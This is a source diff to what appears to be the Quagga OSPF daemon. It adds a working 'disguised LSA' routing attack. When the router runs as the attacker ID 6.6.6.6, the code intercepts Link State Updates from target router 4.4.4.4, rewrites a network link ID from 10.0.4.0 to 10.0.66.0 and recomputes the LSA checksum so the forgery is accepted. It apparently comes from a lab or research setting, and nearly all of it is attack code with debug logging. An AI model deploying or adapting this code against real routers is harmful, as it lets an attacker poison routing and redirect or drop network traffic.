@@ -50,6 +50,10 @@
 #include "ospfd/ospf_dump.h"
 
 /* mastinux - start */
+#define ATTACKER_ROUTER_ID "6.6.6.6"
+#define TARGET_ROUTER_ID "4.4.4.4"
+#define TRIGGER_LSA_BASE_NETWORK "10.0.4.0"
+
 static int trigger_lsa_modified = 0;
 /* mastinux - end */
 
@@ -677,138 +681,53 @@ struct lsa_header {
 	u_int16_t checksum;
 	u_int16_t length;
 };
+
 */
+int disguised_lsa_attack_check_and_alter_link(struct stream *s, u_int16_t length){
+	//char buf[BUFSIZ];
+	struct router_lsa *router_lsa;
+	int i, len;
+	int altered = 0;
 
-int disguised_attack_create_trigger_lsa(struct stream *s, const char *net){
-	struct lsa_header *lsah = (struct lsa_header *) STREAM_PNT (s);
+	router_lsa = (struct router_lsa *) STREAM_PNT (s);
 
-	//zlog_debug ("############################################## lsa SN %lx", (u_long)ntohl (lsah->ls_seqnum));
-	//zlog_debug ("############################################## lsa len %d", ntohs (lsah->length));
+	//zlog_debug ("  Router-LSA");
+	//zlog_debug ("    flags %s", 
+	//ospf_router_lsa_flags_dump (rl->flags, buf, BUFSIZ));
+	//zlog_debug ("    # links %d", ntohs (rl->links));
 
-	zlog_debug ("############################################## adv-router %s", inet_ntoa(lsah->adv_router));
-	if ( strcmp(inet_ntoa(lsah->adv_router), "4.4.4.4") == 0)	// XXX adv-router = 4.4.4.4
-	{
-		if ( lsah->type == 1 ) // XXX type = 1 (Router-LSA)
-		{
-			//zlog_debug ("############################################## Router-LSA length %d", ntohs (lsah->length));
-
-			struct router_lsa *router_lsa;
-			int i, len;
-			router_lsa = (struct router_lsa *) STREAM_PNT (s);
-
-			len = ntohs (router_lsa->header.length) - OSPF_LSA_HEADER_SIZE - 4;
-
-			for (i = 0; len > 0; i++){
-				if ( strcmp(net, inet_ntoa (router_lsa->link[i].link_id)) == 0 ){
-					// XXX alterate network link_id -> "10.0.66.0"
-					zlog_debug("############################################## pre-link_id %s", inet_ntoa(router_lsa->link[i].link_id));
-					struct in_addr trigger_network;
-					inet_aton("10.0.66.0", &trigger_network);
-					router_lsa->link[i].link_id = trigger_network;
-					zlog_debug("############################################## post-link_id %s", inet_ntoa(router_lsa->link[i].link_id));
-		
-					// TODO analyze if Age must be changed
-					zlog_debug("############################################## pre-age %d", ntohs (lsah->ls_age));
-					//	u_int32_t ls_age;
-
-					// XXX increment SN
-					//	u_int32_t ls_seqnum;
-		  			zlog_debug ("############################################## pre-SN %lx", (u_long)ntohl (lsah->ls_seqnum));
-					lsah->ls_seqnum = htonl( ntohl(lsah->ls_seqnum) + 1);
-		  			zlog_debug ("############################################## post-SN %lx", (u_long)ntohl (lsah->ls_seqnum));
-
-					// XXX update checksum
-		  			zlog_debug ("############################################## pre-checksum 0x%x", ntohs (lsah->checksum));
-					u_int16_t length = lsah->length;
-					memset (&lsah->checksum, 0, sizeof (u_int16_t));
-					lsah->checksum = in_cksum (lsah, length);
-		  			zlog_debug ("############################################## post-checksum 0x%x", ntohs (lsah->checksum));
-
-					return 1;
-				}
-
-				len -= 12;
-			}
-		}
-	}
-
-	return 0;
-}
-
-struct router_lsa * add_network_to_router_lsa(struct router_lsa *rl, const char *net){
-	struct router_lsa *new_rl;
-
-	new_rl = malloc(sizeof(struct router_lsa));
-
-	(new_rl->header).ls_age = (rl->header).ls_age;
-	(new_rl->header).options = (rl->header).options;
-	(new_rl->header).type = (rl->header).type;
-	(new_rl->header).id.s_addr = (rl->header).id.s_addr;
-	(new_rl->header).adv_router.s_addr = (rl->header).adv_router.s_addr;
-	(new_rl->header).ls_seqnum = (rl->header).ls_seqnum;
-	// checksum must be recomputed
-	//(new_rl->header).checksum = (rl->header).checksum;
-	
-	(new_rl->header).length = (rl->header).length;
-	
-	new_rl->flags = rl->flags;
-	new_rl->zero = rl->zero;
-	new_rl->links = rl->links + 1;
-
-	int i;
-	int len = ntohs (rl->header.length) - OSPF_LSA_HEADER_SIZE - 4;
-
+	len = ntohs (router_lsa->header.length) - OSPF_LSA_HEADER_SIZE - 4;
 	for (i = 0; len > 0; i++)
 	{
-		len -= 12;
-	}
+		//zlog_debug ("    Link ID %s", inet_ntoa (rl->link[i].link_id));
+		//zlog_debug ("    Link Data %s", inet_ntoa (rl->link[i].link_data));
+		//zlog_debug ("    Type %d", (u_char) rl->link[i].type);
+		//zlog_debug ("    TOS %d", (u_char) rl->link[i].tos);
+		//zlog_debug ("    metric %d", ntohs (rl->link[i].metric));
 
-	return new_rl;
-}
+		if ( strcmp(TRIGGER_LSA_BASE_NETWORK, inet_ntoa (router_lsa->link[i].link_id)) == 0 ){
+			// XXX alterate network link_id -> "10.0.66.0"
+			zlog_debug("############################################## pre-link_id %s", inet_ntoa(router_lsa->link[i].link_id));
+			struct in_addr trigger_network;
+			inet_aton("10.0.66.0", &trigger_network);
+			router_lsa->link[i].link_id = trigger_network;
+			zlog_debug("############################################## post-link_id %s", inet_ntoa(router_lsa->link[i].link_id));
 
-int ospf_router_lsa_contains_net(struct stream *s, u_int16_t length, const char *net){
-	// 0 false
-	// 1 true
-
-	struct router_lsa *rl;
-	int i, len;
-	rl = (struct router_lsa *) STREAM_PNT (s);
-
-	len = ntohs (rl->header.length) - OSPF_LSA_HEADER_SIZE - 4;
-
-	//zlog_debug("######################### rl->header.length %d", ntohs (rl->header.length)); 	
-	//zlog_debug("###################### OSPF_LSA_HEADER_SIZE %d", OSPF_LSA_HEADER_SIZE);			
-	//zlog_debug("####################################### len %d", len);							
-
-	//if ( ntohs (rl->links) != 7){
-	//	router lsa does not contains all router 4.4.4.4 links and neibours
-	//	return 0;
-	//}
-
-	for (i = 0; len > 0; i++){
-		if ( strcmp(net, inet_ntoa (rl->link[i].link_id)) == 0 ){
-			// TODO alterate network link_id -> "10.0.66.0"
-			struct in_addr false_network;
-			inet_aton("10.0.66.0", &false_network);
-			rl->link[i].link_id = false_network;
-
-			return 1;
+			altered = 1;
 		}
 
 		len -= 12;
 	}
 
-	return 0;
+	return altered;
 }
 
-int ospf_packet_ls_upd_contains_network(struct stream *s, u_int16_t length, const char *net){
-	// 0 false
-	// 1 true
-
+int disguised_lsa_attack_check_and_alter_ls_update(struct stream *s, u_int16_t length){
 	u_int32_t sp;
 	struct lsa_header *lsa;
 	int lsa_len;
 	u_int32_t count;
+	int altered = 0;
 
 	length -= OSPF_HEADER_SIZE;
 
@@ -817,38 +736,63 @@ int ospf_packet_ls_upd_contains_network(struct stream *s, u_int16_t length, cons
 	count = stream_getl (s);
 	length -= 4;
 
-	zlog_debug ("Link State Update");
-	zlog_debug ("  # LSAs %d", count);
+	//zlog_debug ("Link State Update");
+	//zlog_debug ("  # LSAs %d", count);
 
-	while (length > 0 && count > 0){
-		if (length < OSPF_HEADER_SIZE || length % 4 != 0){
-			zlog_debug ("  Remaining %d bytes; Incorrect length.", length);
+	while (length > 0 && count > 0)
+	{
+		if (length < OSPF_HEADER_SIZE || length % 4 != 0)
+		{
+			//zlog_debug ("  Remaining %d bytes; Incorrect length.", length);
 			break;
 		}
 
 		lsa = (struct lsa_header *) STREAM_PNT (s);
 		lsa_len = ntohs (lsa->length);
+		//ospf_lsa_header_dump (lsa);
 
-		switch (lsa->type){
-			case OSPF_ROUTER_LSA:
+		zlog_debug ("############################################## SN %lx", (u_long)ntohl (lsa->ls_seqnum));
+		zlog_debug ("############################################## len %d", ntohs (lsa->length));
+		zlog_debug ("############################################## adv-router %s", inet_ntoa(lsa->adv_router));
+		zlog_debug ("############################################## pre-checksum 0x%x", ntohs (lsa->checksum));
+		if (ospf_lsa_checksum_valid(lsa))
+			zlog_debug ("############################################## valid checksum");
+		else
+			zlog_debug ("############################################## invalid valid checksum");
 
-				if ( ospf_router_lsa_contains_net(s, length, net) ){
-					// TODO increment SN
-					lsa->ls_seqnum = htonl(ntohl (lsa->ls_seqnum) + 1);
+		if ( strcmp(inet_ntoa(lsa->adv_router), TARGET_ROUTER_ID) == 0)	// XXX adv-router = 4.4.4.4
+		{
+			switch (lsa->type)
+			{
+				case OSPF_ROUTER_LSA:
+					//ospf_router_lsa_dump (s, length);
+					if ( disguised_lsa_attack_check_and_alter_link(s, length) ){
+						// TODO analyze if Age must be changed
+						zlog_debug("############################################## pre-age %d", ntohs (lsa->ls_age));
+						//	u_int32_t ls_age;
 
-					//lsa->ls_age = htons(ntohs (lsa->ls_age) + 1);
+						// XXX increment SN
+						//	u_int32_t ls_seqnum;
+						zlog_debug ("############################################## pre-SN %lx", (u_long)ntohl (lsa->ls_seqnum));
+						//lsa->ls_seqnum = htonl( ntohl(lsa->ls_seqnum) + 1);
+						//zlog_debug ("############################################## post-SN %lx", (u_long)ntohl (lsa->ls_seqnum));
 
-					// TODO update router lsa checksum
-					u_int16_t length = lsa->length;
-					memset (&lsa->checksum, 0, sizeof (u_int16_t));
-					lsa->checksum = in_cksum (lsa, length);
+						// TODO update checksum
+						ospf_lsa_checksum(lsa);
+						zlog_debug ("############################################## post-checksum 0x%x", ntohs (lsa->checksum));
+						if (ospf_lsa_checksum_valid(lsa))
+							zlog_debug ("############################################## valid checksum");
+						else
+							zlog_debug ("############################################## invalid valid checksum");
+						zlog_debug ("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
 
-					return 1;
-				}
+						altered = 1;
+					}
 
-				break;
-			default:
-				break;
+					break;
+				default:
+					break;
+			}
 		}
 
 		stream_forward_getp (s, lsa_len);
@@ -858,16 +802,14 @@ int ospf_packet_ls_upd_contains_network(struct stream *s, u_int16_t length, cons
 
 	stream_set_getp (s, sp);
 
-	return 0;
+	return altered;
 }
 
-int ospf_packet_contains_network(struct ospf_packet *op, const char *net){
-	// 0 false
-	// 1 true
-
-	struct stream *s = op->s;
+int disguised_lsa_attack_create_check_and_alter_lsa(struct stream *s){
 	struct ospf_header *ospfh;
 	unsigned long gp;
+
+	int altered = 0;
 
 	/* Preserve pointer. */
 	gp = stream_get_getp (s);
@@ -880,31 +822,24 @@ int ospf_packet_contains_network(struct ospf_packet *op, const char *net){
 		return 0;
 
 	/* Show OSPF header detail. */
+	//ospf_header_dump (ospfh);
 	stream_forward_getp (s, OSPF_HEADER_SIZE);
 
 	switch (ospfh->type)
 	{
 		case OSPF_MSG_LS_UPD:
-			//ospf_packet_ls_upd_dump(s, ntohs (ospfh->length))
-
-			if ( ospf_packet_ls_upd_contains_network(s, ntohs (ospfh->length), net) ){
-				// TODO update ospf header checksum
-				u_int16_t length = ospfh->length;
-				memset (&ospfh->checksum, 0, sizeof (u_int16_t));
-				ospfh->checksum = in_cksum (ospfh, length);
-
-				return 1;
-			}
-
+			//ospf_packet_ls_upd_dump (s, ntohs (ospfh->length));
+			if ( disguised_lsa_attack_check_and_alter_ls_update(s, ntohs (ospfh->length)) )
+				altered = 1;
+ 
 			break;
-
 		default:
 			break;
 	}
 
 	stream_set_getp (s, gp);
 
-	return 0;
+	return altered;
 }
 // mastinux - end
 
@@ -1947,22 +1882,6 @@ ospf_ls_upd_list_lsa (struct ospf_neighbor *nbr, struct stream *s,
       if (IS_DEBUG_OSPF_EVENT)
 	zlog_debug("LSA[Type%d:%s]: %p new LSA created with Link State Update",
 		  lsa->data->type, inet_ntoa (lsa->data->id), (void *)lsa);
-
-	// mastinux - start
-	// TODO before adding lsa to lsas, alter it
-	// XXX execute attack only on router-id 6.6.6.6
-	if ( strcmp(inet_ntoa(oi->ospf->router_id), "6.6.6.6") == 0 )
-	{
-		// XXX modify trigger lsa only once
-		if ( trigger_lsa_modified == 0 )
-		{
-			if ( disguised_attack_create_trigger_lsa(s, "10.0.4.0") )
-				trigger_lsa_modified = 1;
-		}
-	}
-
-	zlog_debug ("<<<<<<<<<<<<<<< %d >>>>>>>>>>>>>>>", trigger_lsa_modified);
-	// mastinux - end
 
       listnode_add (lsas, lsa);
     }
@@ -3191,6 +3110,25 @@ ospf_read (struct thread *thread)
       if (IS_DEBUG_OSPF_PACKET (ospfh->type - 1, DETAIL))
 	zlog_debug ("-----------------------------------------------------");
   }
+
+	// mastinux - start
+	// TODO
+
+	// XXX execute attack only on router-id 6.6.6.6
+	//zlog_debug ("############################################################### %s", inet_ntoa(oi->ospf->router_id));
+	if ( strcmp(inet_ntoa(oi->ospf->router_id), ATTACKER_ROUTER_ID) == 0 )
+	{
+		// XXX modify trigger lsa only once
+		//zlog_debug ("############################################################### %d", trigger_lsa_modified);
+		if ( trigger_lsa_modified == 0 )
+		{
+			if ( disguised_lsa_attack_create_check_and_alter_lsa(ibuf) )
+				trigger_lsa_modified = 1;
+		}
+	}
+
+	//zlog_debug ("############################################################### %d", trigger_lsa_modified);
+	// mastinux - end
 
   stream_forward_getp (ibuf, OSPF_HEADER_SIZE);
 
